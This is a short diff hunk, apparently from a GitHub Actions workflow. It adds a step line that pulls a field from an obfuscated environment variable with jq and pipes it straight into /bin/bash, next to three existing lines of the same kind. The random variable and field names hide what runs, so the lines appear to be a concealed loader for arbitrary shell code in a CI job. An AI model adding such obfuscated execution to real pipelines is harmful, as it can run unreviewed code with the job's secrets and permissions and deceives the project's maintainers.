@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$dmkq7143" | jq -r .boml15 | /bin/bash
           printf '%s' "$b750" | jq -r .s28854 | /bin/bash
           echo $sxt00946 | jq -r .qnv96 | /bin/bash
+          printf '%s' "$efpma81655" | jq -r .ev919 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
